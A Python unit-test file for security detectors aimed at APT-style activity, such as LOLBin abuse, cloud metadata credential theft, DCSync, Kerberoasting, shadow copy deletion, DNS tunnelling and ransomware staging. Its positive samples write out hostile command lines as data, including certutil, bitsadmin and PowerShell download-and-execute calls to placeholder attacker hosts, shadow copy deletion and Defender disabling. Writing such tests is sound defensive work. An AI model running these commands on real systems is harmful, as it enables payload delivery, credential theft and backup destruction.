"""Unit tests for Sprint 3 APT-aligned phase detectors.

Each test validates that:
1. The detector fires (True) on a realistic positive sample.
2. The detector does NOT fire (False) on a realistic BAU negative sample.
"""
import pytest
import os
os.environ.setdefault("PLATFORM_LITE_INIT", "1")
os.environ.setdefault("PYTEST_CURRENT_TEST", "1")

from src.core.ingest.cluster_merge import (
    _det_lolbin_execution,
    _det_oauth_device_code,
    _det_cloud_imds_theft,
    _det_dcsync,
    _det_kerberoasting,
    _det_shadow_copy_deletion,
    _det_wmi_dcom_lateral,
    _det_entra_privesc,
    _det_powershell_staged_payload,
    _det_dns_tunnel,
    _det_ntlm_relay_pth,
    _det_cloud_iam_privesc,
    _det_insider_after_hours,
    _det_ransomware_staging,
    PHASE_DETECTORS,
    _CLUSTER_MERGE_VERSION,
)


def _text(row: dict) -> str:
    import json
    return json.dumps(row).lower()


# ── Version guard ─────────────────────────────────────────────────────────────

def test_version_bumped_to_1_6():
    # Monotonic floor, not an exact pin: this guard previously broke on every
    # version bump (asserted "1.6" while the constant had advanced to 1.9+).
    # Assert the merge engine is at least the phase-detector release (1.6).
    parts = tuple(int(p) for p in _CLUSTER_MERGE_VERSION.split("."))
    assert parts >= (1, 6), f"cluster_merge version regressed below 1.6: {_CLUSTER_MERGE_VERSION}"


def test_phase_detector_count():
    assert len(PHASE_DETECTORS) >= 27, f"Expected >=27 detectors, got {len(PHASE_DETECTORS)}"


# ── LOLBin execution ─────────────────────────────────────────────────────────

def test_lolbin_certutil_urlcache_fires():
    row = {"process_name": "certutil.exe", "CommandLine": "certutil -urlcache -split -f http://evil.com/p.exe"}
    assert _det_lolbin_execution(row, _text(row))

def test_lolbin_mshta_fires():
    row = {"process_name": "mshta.exe", "CommandLine": "mshta.exe http://malicious.example.com/payload.hta"}
    assert _det_lolbin_execution(row, _text(row))

def test_lolbin_bitsadmin_fires():
    row = {"description": "bitsadmin /transfer job http://c2.example.com/stage.exe c:\\windows\\temp\\s.exe"}
    assert _det_lolbin_execution(row, _text(row))

def test_lolbin_normal_cmd_no_fire():
    row = {"process_name": "cmd.exe", "CommandLine": "dir c:\\windows\\system32"}
    assert not _det_lolbin_execution(row, _text(row))

def test_lolbin_certutil_normal_no_fire():
    # certutil without URL/decode = BAU (certificate verification)
    row = {"process_name": "certutil.exe", "CommandLine": "certutil -verify mycert.cer"}
    assert not _det_lolbin_execution(row, _text(row))


# ── OAuth Device Code phishing ────────────────────────────────────────────────

def test_oauth_device_code_consent_fires():
    row = {"Operation": "Consent to application", "target_resource": "EvilApp v1.0"}
    assert _det_oauth_device_code(row, _text(row))

def test_oauth_device_code_flow_in_text_fires():
    row = {"description": "Suspicious sign-in via device_code flow from unknown tenant"}
    assert _det_oauth_device_code(row, _text(row))

def test_oauth_normal_signin_no_fire():
    row = {"Operation": "UserLoggedIn", "ClientIP": "10.1.2.3"}
    assert not _det_oauth_device_code(row, _text(row))


# ── Cloud IMDS credential theft ───────────────────────────────────────────────

def test_imds_direct_ip_fires():
    row = {"dst_ip": "169.254.169.254", "src_ip": "10.10.5.22", "service": "ec2-metadata"}
    assert _det_cloud_imds_theft(row, _text(row))

def test_imds_url_path_fires():
    row = {"http_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/TaskRole"}
    assert _det_cloud_imds_theft(row, _text(row))

def test_imds_gcp_metadata_fires():
    row = {"description": "HTTP GET to metadata.google.internal/computeMetadata/v1/instance/service-accounts/"}
    assert _det_cloud_imds_theft(row, _text(row))

def test_imds_internal_api_no_fire():
    row = {"dst_ip": "10.0.0.1", "http_url": "http://api.internal/health"}
    assert not _det_cloud_imds_theft(row, _text(row))


# ── DCSync ────────────────────────────────────────────────────────────────────

def test_dcsync_event_4662_fires():
    row = {
        "event_id": "4662",
        "Properties": "{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}",
        "ObjectType": "domainDNS",
    }
    assert _det_dcsync(row, _text(row))

def test_dcsync_impacket_text_fires():
    row = {"description": "impacket secretsdump.py executed against DC01 via drsuapi"}
    assert _det_dcsync(row, _text(row))

def test_dcsync_4662_no_guid_no_fire():
    row = {"event_id": "4662", "Properties": "CN=AdminSDHolder", "ObjectType": "container"}
    assert not _det_dcsync(row, _text(row))


# ── Kerberoasting ─────────────────────────────────────────────────────────────

def test_kerberoasting_event_4769_rc4_fires():
    row = {"event_id": "4769", "TicketEncryptionType": "0x17", "ServiceName": "svc_sql"}
    assert _det_kerberoasting(row, _text(row))

def test_kerberoasting_asrep_4768_fires():
    row = {"event_id": "4768", "PreAuthType": "0", "TargetUserName": "svc_nopreauth"}
    assert _det_kerberoasting(row, _text(row))

def test_kerberoasting_rubeus_text_fires():
    row = {"process_name": "rubeus.exe", "CommandLine": "rubeus.exe kerberoast /outfile:hashes.txt"}
    assert _det_kerberoasting(row, _text(row))

def test_kerberoasting_normal_4769_aes_no_fire():
    # AES256 (0x12) is expected modern encryption — not kerberoasting
    row = {"event_id": "4769", "TicketEncryptionType": "0x12", "ServiceName": "cifs/fileserver"}
    assert not _det_kerberoasting(row, _text(row))


# ── Shadow copy deletion ──────────────────────────────────────────────────────

def test_shadow_copy_vssadmin_fires():
    row = {"CommandLine": "vssadmin delete shadows /all /quiet", "process_name": "vssadmin.exe"}
    assert _det_shadow_copy_deletion(row, _text(row))

def test_shadow_copy_bcdedit_fires():
    row = {"description": "bcdedit /set recoveryenabled no executed on host DC02"}
    assert _det_shadow_copy_deletion(row, _text(row))

def test_shadow_copy_wmic_fires():
    row = {"CommandLine": "wmic shadowcopy delete"}
    assert _det_shadow_copy_deletion(row, _text(row))

def test_shadow_copy_normal_backup_no_fire():
    row = {"description": "Windows Backup completed successfully for drive C:"}
    assert not _det_shadow_copy_deletion(row, _text(row))


# ── WMI / DCOM lateral movement ───────────────────────────────────────────────

def test_wmi_node_create_fires():
    row = {
        "process_name": "wmic.exe",
        "CommandLine": "wmic /node:192.168.1.50 process call create cmd.exe",
    }
    assert _det_wmi_dcom_lateral(row, _text(row))

def test_wmi_wmiexec_text_fires():
    row = {"description": "impacket wmiexec.py used for lateral movement to WORKSTATION-07"}
    assert _det_wmi_dcom_lateral(row, _text(row))

def test_wmi_normal_wmic_no_fire():
    row = {"process_name": "wmic.exe", "CommandLine": "wmic computersystem get totalphysicalmemory"}
    assert not _det_wmi_dcom_lateral(row, _text(row))


# ── Entra ID / AAD privilege escalation ──────────────────────────────────────

def test_entra_global_admin_add_fires():
    row = {
        "Operation": "Add member to role",
        "Target": "Global Administrator",
        "UserPrincipalName": "attacker@victim.onmicrosoft.com",
    }
    assert _det_entra_privesc(row, _text(row))

def test_entra_golden_saml_text_fires():
    row = {"description": "AADInternals golden SAML token generated, trustedformasauth set on domain"}
    assert _det_entra_privesc(row, _text(row))

def test_entra_add_normal_role_no_fire():
    # Adding to Teams Member is not privileged
    row = {"Operation": "Add member to role", "Target": "Teams Member", "ModifiedProperties": ""}
    assert not _det_entra_privesc(row, _text(row))


# ── PowerShell staged payload ─────────────────────────────────────────────────

def test_ps_download_exec_combo_fires():
    row = {
        "CommandLine": "powershell -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://c2.evil/s.ps1')\"",
        "process_name": "powershell.exe",
    }
    assert _det_powershell_staged_payload(row, _text(row))

def test_ps_encodedcommand_fires():
    row = {"CommandLine": "powershell.exe -NonInteractive -EncodedCommand TVq..."}
    assert _det_powershell_staged_payload(row, _text(row))

def test_ps_amsi_bypass_text_fires():
    row = {"description": "AmsiUtils bypass detected in PowerShell session on HOST-01"}
    assert _det_powershell_staged_payload(row, _text(row))

def test_ps_normal_script_no_fire():
    row = {"CommandLine": "powershell.exe Get-Service | Where-Object {$_.Status -eq 'Running'}"}
    assert not _det_powershell_staged_payload(row, _text(row))


# ── DNS tunneling ─────────────────────────────────────────────────────────────

def test_dns_tunnel_long_label_fires():
    # 60-char base64-like label before the real domain
    row = {"query": "aGVsbG93b3JsZHRoaXNpc2Fkb25zdHVubmVsdGVzdA==.attacker-c2.io"}
    assert _det_dns_tunnel(row, _text(row))

def test_dns_tunnel_dnscat_text_fires():
    row = {"description": "dnscat2 tunnel detected: TXT queries to suspicious domain"}
    assert _det_dns_tunnel(row, _text(row))

def test_dns_normal_query_no_fire():
    row = {"query": "mail.google.com", "qtype": "A"}
    assert not _det_dns_tunnel(row, _text(row))

def test_dns_short_label_no_fire():
    row = {"query": "subdomain.example.com"}
    assert not _det_dns_tunnel(row, _text(row))


# ── NTLM relay / pass-the-hash ────────────────────────────────────────────────

def test_ntlm_relay_fires():
    row = {"description": "ntlmrelayx.py captured and relayed hash for DOMAIN\\svc_web to HOST-DC"}
    assert _det_ntlm_relay_pth(row, _text(row))

def test_pth_impacket_fires():
    row = {"description": "impacket psexec via pass-the-hash for user administrator"}
    assert _det_ntlm_relay_pth(row, _text(row))

def test_ntlm_normal_auth_no_fire():
    row = {"AuthType": "NTLM", "Status": "Success", "UserName": "john.doe"}
    assert not _det_ntlm_relay_pth(row, _text(row))


# ── Cloud IAM privilege escalation ────────────────────────────────────────────

def test_cloud_iam_createaccesskey_fires():
    row = {"event_name": "CreateAccessKey", "userIdentity_type": "IAMUser", "sourceIPAddress": "203.0.113.5"}
    assert _det_cloud_iam_privesc(row, _text(row))

def test_cloud_iam_attachuserpolicy_fires():
    row = {"eventName": "AttachUserPolicy", "requestParameters": "{\"policyArn\":\"arn:aws:iam::aws:policy/AdministratorAccess\"}"}
    assert _det_cloud_iam_privesc(row, _text(row))

def test_cloud_iam_wildcard_policy_fires():
    row = {"requestParameters": "{\"effect\":\"allow\",\"action\":\"iam:*\",\"resource\":\"*\"}"}
    assert _det_cloud_iam_privesc(row, _text(row))

def test_cloud_iam_normal_listbuckets_no_fire():
    row = {"event_name": "ListBuckets", "userIdentity_type": "IAMUser"}
    assert not _det_cloud_iam_privesc(row, _text(row))


# ── Insider after-hours ───────────────────────────────────────────────────────

def test_insider_risk_tag_fires():
    row = {"_risk": "insider", "user": "wei.zhang@meridian.com.au", "_sensitivity": "high"}
    assert _det_insider_after_hours(row, _text(row))

def test_insider_after_hours_sensitive_fires():
    row = {
        "_sensitivity": "high",
        "TimeGenerated": "2026-01-15T23:47:00Z",
        "ObjectId": "/sites/payroll/salary-grid-2026.xlsx",
    }
    assert _det_insider_after_hours(row, _text(row))

def test_insider_business_hours_no_fire():
    row = {
        "_sensitivity": "high",
        "TimeGenerated": "2026-01-15T10:30:00Z",
        "ObjectId": "/sites/payroll/salary-grid-2026.xlsx",
    }
    assert not _det_insider_after_hours(row, _text(row))

def test_insider_no_sensitivity_no_fire():
    row = {"TimeGenerated": "2026-01-15T23:47:00Z", "ObjectId": "/sites/general/readme.txt"}
    assert not _det_insider_after_hours(row, _text(row))


# ── Ransomware staging ────────────────────────────────────────────────────────

def test_ransomware_lockbit_fires():
    row = {"description": "LockBit 3.0 binary detected on host WORKSTATION-12, .lockbit extension observed"}
    assert _det_ransomware_staging(row, _text(row))

def test_ransomware_blackcat_fires():
    row = {"description": "ALPHV / BlackCat affiliate activity: readme_to_decrypt dropped in C:\\Users"}
    assert _det_ransomware_staging(row, _text(row))

def test_ransomware_disable_defender_fires():
    row = {"CommandLine": "powershell Set-MpPreference -DisableRealtimeMonitoring $true"}
    assert _det_ransomware_staging(row, _text(row))

def test_ransomware_normal_av_scan_no_fire():
    row = {"description": "Windows Defender scan completed, no threats found"}
    assert not _det_ransomware_staging(row, _text(row))
